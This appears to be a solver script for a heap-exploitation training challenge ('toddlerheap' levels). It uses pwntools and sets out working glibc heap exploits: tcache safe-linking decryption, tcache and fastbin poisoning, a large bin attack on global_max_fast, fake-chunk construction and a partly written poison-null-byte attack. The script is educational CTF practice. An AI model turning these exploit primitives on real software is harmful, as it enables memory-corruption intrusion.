#!/usr/bin/python
from pwn import *


def get_addr_len(address):
    '''Get address length in bits'''
    len = 0
    while address & 0xffffffffffffffff:  # assume 64 bit addressing
        len += 4
        address = address >> 4
    return len

def decrypt_tcache(encrypted_address):
    '''
    https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation

    Shifting and masking to slowly build our decrypted address.
    '''
    addr_len = get_addr_len(encrypted_address)

    #Fencepost to get initial decrypted value.
    #The first 12 bits of the addr are already good to go due to how the encryption works.
    offset = 12
    mask = 0xfff << addr_len - offset
    decrypted = encrypted_address & mask

    #Each time we iterate, another 12 bits is decrypted. Add that to our decrypted value.
    #We control which bits we retrieve via a moving mask.
    offset += 12
    while offset < addr_len:
        mask = 0xfff << addr_len - offset
        result = (decrypted >> 12) ^ encrypted_address
        decrypted += result & mask
        offset += 12

    return decrypted

def prepare(p):
    p.recvuntil(b'quit): ')

def read_copy(p, id, data):
    prepare(p)
    p.sendline('read_copy')
    p.sendline(id)
    p.sendline(data)

def read_to_global(p, data):
    prepare(p)
    p.sendline(b'read_to_global')
    p.sendline(str(len(data)))
    p.sendline(data)

def malloc_id(p, id: bytes, size: bytes):
    prepare(p)
    p.sendline(b'malloc')
    p.sendline(id)
    p.sendline(size)

def calloc_id(p, id: bytes, size: bytes):
    prepare(p)
    p.sendline(b'calloc')
    p.sendline(id)
    p.sendline(size)
    
def free_id(p, id):
    prepare(p)
    p.sendline(b'free')
    p.sendline(id)

def safe_read(p, id, data):
    prepare(p)
    p.sendline(b'safe_read')
    p.sendline(id)
    p.sendline(data)

def safer_read(p, id, data):
    prepare(p)
    p.sendline(b'safer_read')
    p.sendline(id)
    p.sendline(data)

def puts_id(p, id):
    prepare(p)
    p.sendline(b'puts')
    p.sendline(id)

def read_flag(p):
    prepare(p)
    p.sendline(b'read_flag')

def send_flag(p):
    prepare(p)
    p.sendline(b'send_flag')

def read_id(p, id, size, data):
    prepare(p)
    p.sendline(b'read')
    p.sendline(id)
    p.sendline(size)
    p.send(data)

def level3(p):
    
    malloc_id(p, b'0', b'2100')
    malloc_id(p, b'1', b'1100')

    malloc_id(p, b'2', b'1100')

    free_id(p, b'0')
    free_id(p, b'1')

    
    read_flag(p)

def level3_1(p):
    malloc_id(p, b'0', b'9490')
    malloc_id(p, b'1', b'1100')

    malloc_id(p, b'2', b'1100')

    free_id(p, b'0')
    free_id(p, b'1')

    read_flag(p)

def level4(p):
    authenticated = p64(0x004041c0 - 0x20)

    malloc_id(p, b'0', b'3000')
    malloc_id(p, b'1', b'8000')
    malloc_id(p, b'2', b'4000')
    malloc_id(p, b'3', b'8000')
    free_id(p, b'0')
    free_id(p, b'2')

    puts_id(p, b'2')
    for _ in range(3):
        data = p.recvline()
    heap_addr = u64(data.split(b' ')[1].strip().ljust(8, b'\x00'))
    heap_addr += 0x5a10
    print(hex(heap_addr))

    malloc_id(p, b'4', b'6020')
    malloc_id(p, b'5', b'8000')
    malloc_id(p, b'6', b'6000')
    free_id(p, b'4')
    malloc_id(p, b'7', b'8000')
    
    puts_id(p, b'4')
    for _ in range(3):
        data = p.recvline()
    fd_bk = u64(data.split(b' ')[1].strip().ljust(8, b'\x00'))
    print(hex(fd_bk))

    safe_read(p, b'4', p64(fd_bk) + p64(fd_bk) + p64(heap_addr) + authenticated)
    free_id(p, b'6')
    malloc_id(p, b'8', b'8000')

def level5(p):
    # Get flag address from output
    for _ in range(5):
        data = p.recvline()
        print(data)
    flag_str = b'0'*4 + data.split(b' ')[4][:-2][2:]
    flag = int(flag_str, 16)
    print(f'flag addr: {hex(flag)}')

    # Leak libc addr & calculate addr of global_max_fast
    malloc_id(p, b'0', b'1100')
    malloc_id(p, b'1', b'1100')
    malloc_id(p, b'2', b'1100')
    free_id(p, b'1')
    read_id(p, b'0', b'1120', b'a'*1120)

    puts_id(p, b'0')
    for _ in range(3):
        data = p.recvline()
    libc_addr = u64(data[-7:].strip().ljust(8, b'\x00'))
    global_max_fast = libc_addr + 0x6820
    print(f'global_max_fast: {hex(global_max_fast)}')

    #Clean up damage
    read_id(p, b'0', b'1120', b'a'*1112 + p64(0x460))
    malloc_id(p, b'0', b'1100')
    
    # these are for later ;) fast bin attack
    malloc_id(p, b'10', b'1100')
    malloc_id(p, b'11', b'1470')
    malloc_id(p, b'12', b'8000')
    malloc_id(p, b'13', b'1470')
    malloc_id(p, b'14', b'8000')

    # Begin large bin attack.
    # Before finishing write to global_max_fast, have "fastbin" entried already malloc'd

    malloc_id(p, b'4', b'5200')
    malloc_id(p, b'5', b'5220')
    malloc_id(p, b'6', b'8000')
    malloc_id(p, b'7', b'5200')
    free_id(p, b'5')
    malloc_id(p, b'8', b'8000') # chunk 1 now in large bins

    # Leaking addrs we need to stomp
    read_id(p, b'4', b'5216', b'a'*5216) 
    puts_id(p, b'4')
    for _ in range(3):
        data = p.recvline()
    next_prev = u64(data[-7:].rstrip().ljust(8, b'\x00'))
    print(hex(next_prev))

    read_id(p, b'4', b'5232', b'a'*5232) 
    puts_id(p, b'4')
    for _ in range(3):
        data = p.recvline()
    nsize_psize = u64(data[-7:].rstrip().ljust(8, b'\x00'))
    print(hex(nsize_psize))

    read_id(p, b'4', b'5249', b'a'*5208 + p64(0x1471) + p64(next_prev) + p64(next_prev) + p64(nsize_psize) + p64(global_max_fast - 0x20))
    free_id(p, b'7')
    malloc_id(p, b'9', b'8000')

    ### Free our evil fastbin entries and write flag addr to first's next ptr
    free_id(p, b'13')
    free_id(p, b'11') 

    encoded_flag = (flag - 0x10) ^ ((flag >> 12) + 1)
    read_id(p, b'10', b'1138', b'B'*1112 + p64(0x5d1) + p64(encoded_flag))

    ## allocate twice and print
    malloc_id(p, b'0', b'1470')
    malloc_id(p, b'0', b'1470')
    puts_id(p, b'0')

def level6_0(p):
    '''Double Free and UAF vulns only allowing 0x18 sized chunks.

    Able to get heap leak ('encrypted') via UAF (puts after free)

    Gives address flag is written to in data section, which lets us bypass pie

    * what's read_to_global good for?
    * writes after where all the chunks pointers are...
    * goal is probably to use this to make a fake chunk or something, it's near the flag.

    * how to poison tcache or fastbins with safer_read?
    * free doesn't actually set size to 0?
    * okay I can poison tcache then I guess.

    * what if we get a chunk pointing to those size values?
      could overwrite them to allow us to write more data... This could let us print the flag
      without Calloc erasing it.

    * what if we overwrite one of those pointers too? We could point it at the data we control
      with read_to_global. We could make a fake chunk there, then make it's size large enough
      to reach the flag. Then we just write A's until the flag and puts our fake chunk. The chunk
      size we write in metadata can still be 0x21, doesn't matter. All that matters is the sizes
      in that allocation tracking struct.

    * calloc ignores tcache and only likes fastbins???
    '''
    # Get BSS Leak
    p.recvuntil('flag into ')
    flag_leak = int(p.recvline().strip()[:-1], 16)
    print(f'flag/bss leak: {hex(flag_leak)}')
    binary_base = flag_leak - 0x44c8
    print(f'binary base: {hex(binary_base)}')

    # Leak Heap
    for id in range(10):
        calloc_id(p, str(id), b'24')

    for id in range(10):
        free_id(p, str(id))

    puts_id(p, '8')
    p.recvuntil('Data: ')
    heap_leak = p.recvline().strip()
    if len(heap_leak) < 6:
        print("bad address, try again")
        exit(1)

    heap_leak  = u64(heap_leak.ljust(8, b'\x00'))
    print(f'encrypted heap leak: {hex(heap_leak)}')
    decrypted_heap = decrypt_tcache(heap_leak)
    print(f'decrypted heap base: {hex(decrypted_heap)}')
    heap_key = decrypted_heap >> 12

    chunk_start = binary_base + 0x4140
    sizes_start = binary_base + 0x41c0
    read_start = binary_base + 0x4200
    print(f'read start: {hex(read_start)}')

    distance_to_flag = flag_leak - read_start

    '''make a fake chunk at the flag location'''

    read_to_global(p, b'A'*(distance_to_flag-0x20) + p64(0x21))
    
    encrypted_flag_chunk = (flag_leak-0x28) ^ heap_key
    safer_read(p, '9', p64(encrypted_flag_chunk))

    # Get our fake chunk and fill it with data so that it hits the flag, then print
    # Couldn't just allocate on the flag due to calloc
    calloc_id(p, '0', '24')
    calloc_id(p, '0', '24')
    safer_read(p, '0', b'A'*24)
    puts_id(p, b'0')

def level6_1(p):
    ''''''
    # Get BSS Leak
    p.recvuntil('flag into ')
    flag_leak = int(p.recvline().strip()[:-1], 16)
    print(f'flag/bss leak: {hex(flag_leak)}')
    binary_base = flag_leak - 0x42b8
    print(f'binary base: {hex(binary_base)}')

    # Leak Heap
    for id in range(10):
        calloc_id(p, str(id), b'24')

    for id in range(10):
        free_id(p, str(id))

    puts_id(p, '8')
    p.recvuntil('Data: ')
    heap_leak = p.recvline().strip()
    if len(heap_leak) < 6:
        print("bad address, try again")
        exit(1)

    heap_leak  = u64(heap_leak.ljust(8, b'\x00'))
    print(f'encrypted heap leak: {hex(heap_leak)}')
    decrypted_heap = decrypt_tcache(heap_leak)
    print(f'decrypted heap base: {hex(decrypted_heap)}')
    heap_key = decrypted_heap >> 12

    read_start = binary_base + 0x4200
    print(f'read start: {hex(read_start)}')


    distance_to_flag = flag_leak - read_start
    '''make a fake chunk at the flag location'''

    read_to_global(p, b'A'*(distance_to_flag-0x20) + p64(0x21))
    
    encrypted_flag_chunk = (flag_leak-0x28) ^ heap_key
    safer_read(p, '9', p64(encrypted_flag_chunk))

    # Get our fake chunk and fill it with data so that it hits the flag, then print
    # Couldn't just allocate on the flag due to calloc
    calloc_id(p, '0', '24')
    calloc_id(p, '0', '24')
    safer_read(p, '0', b'A'*24)
    puts_id(p, b'0')

def level7_0(p):
    '''Chunk sizes are placed close to the flag... this could allow us to create a fake chunk

    For example, requesting a size 33 chunks results in a 0x21 size field being placed in the alloc_struct.
    We could just request a size 33 chunk in index 16 and that should do the job.
    '''
    p.recvuntil('flag into ')
    flag_leak = int(p.recvline().strip()[:-1], 16)

    print(f'flag/bss leak: {hex(flag_leak)}')
    binary_base = flag_leak - 0x4218
    print(f'binary base: {hex(binary_base)}')

    # Leak Heap
    for id in range(10):
        calloc_id(p, str(id), b'24')

    for id in range(10):
        free_id(p, str(id))

    puts_id(p, '8')
    p.recvuntil('Data: ')
    heap_leak = p.recvline().strip()
    if len(heap_leak) < 6:
        print("bad address, try again")
        exit(1)

    heap_leak  = u64(heap_leak.ljust(8, b'\x00'))
    print(f'encrypted heap leak: {hex(heap_leak)}')
    decrypted_heap = decrypt_tcache(heap_leak)
    print(f'decrypted heap base: {hex(decrypted_heap)}')
    heap_key = decrypted_heap >> 12

    calloc_id(p, '10', b'33') # size field for our fake chunk ends up in tracker before flag

    encrypted_flag_chunk = (flag_leak-0x28) ^ heap_key
    safer_read(p, '9', p64(encrypted_flag_chunk))

    calloc_id(p, '0', '24')
    calloc_id(p, '0', '24')
    safer_read(p, '0', 'A'*24)

    puts_id(p, '0')

def level7_1(p):
    ''''''
    p.recvuntil('flag into ')
    flag_leak = int(p.recvline().strip()[:-1], 16)

    print(f'flag/bss leak: {hex(flag_leak)}')
    binary_base = flag_leak - 0x4218
    print(f'binary base: {hex(binary_base)}')

    # Leak Heap
    for id in range(10):
        calloc_id(p, str(id), b'24')

    for id in range(10):
        free_id(p, str(id))

    puts_id(p, '8')
    p.recvuntil('Data: ')
    heap_leak = p.recvline().strip()
    if len(heap_leak) < 6:
        print("bad address, try again")
        exit(1)

    heap_leak  = u64(heap_leak.ljust(8, b'\x00'))
    print(f'encrypted heap leak: {hex(heap_leak)}')
    decrypted_heap = decrypt_tcache(heap_leak)
    print(f'decrypted heap base: {hex(decrypted_heap)}')
    heap_key = decrypted_heap >> 12

    calloc_id(p, '10', b'33') # size field for our fake chunk ends up in tracker before flag

    encrypted_flag_chunk = (flag_leak-0x28) ^ heap_key
    safer_read(p, '9', p64(encrypted_flag_chunk))

    calloc_id(p, '0', '24')
    calloc_id(p, '0', '24')
    safer_read(p, '0', 'A'*24)

    puts_id(p, '0')

def level8_0(p):
    '''I believe vuln is null terminator being added after length of read... off by one.

    This could potentially be leveraged into poison null byte or House of Ein.

    Yup that's the deal, overwrote the size field of next chunk.

    Can use read_flag to get the flag addr.

    allocate big chunk (0x400)
    allocate small chunk
    allocate big chunk (0x400)
    allocate another small chunk so two chunks in tcache (same size)
    allocate guard chunk

    Use second chunk to overwrite prev inuse flag within second big chunk.
    Set prev size field (now in second chunk) to size of first + second chunks.
    Free third chunk causing consolidation with first chunk.
    Request enough data to get the new big chunk
    Free second small chunk then first small chunk... now the first small chunk we overlap
    has heap pointers in it. 
    Fill new big chunk with data up until the heap pointers in the second chunk. Leak it.
    De-obfuscate to get our obfuscation key.
    Overwrite pointer with pointer to the flag.
    
    Allocate, allocate, win.

    Took a look at 8.1, we'll need to base the flag addr off of heap leak as addresses are no longer printed.
    Let's just knock that out now so 8.1 is a freebie.

    !!!!!!!
    To get a leak we need to consolidate... can't consolidate without a leak...
    Unless we do poison null byte, so let's switch to that.
    !!!!!!!

    '''
    read_flag(p) # Do this early to make calculation off heap base easy

    malloc_id(p, '0', str(0x18))
    malloc_id(p, '1', str(0x550))
    malloc_id(p, '2', str(0x500))
    malloc_id(p, '3', str(0x18))

    # Make fake chunk within victim to meet size field checks
    read_copy(p, '1', b'a'*0x4f0 + p64(0x500) + p64(0x60))

    # Stick victim in unsorted bin
    free_id(p, '1')

    # Overwrite size, preventing proper prev size updating
    read_copy(p, '0', b'A'*0x18)

    malloc_id(p, '4', str(0x4a8))
    malloc_id(p, '5', str(0x48))






level = 'level8.0'
#p = process(f'/challenge/toddlerheap_{level}')
#p = process(['./ld-2.35.so', f'./toddlerheap_{level}'])
p = gdb.debug(['./ld-2.35.so',  f'./toddlerheap_{level}'], gdbscript='''
c            
''')


level8_0(p)
p.interactive()
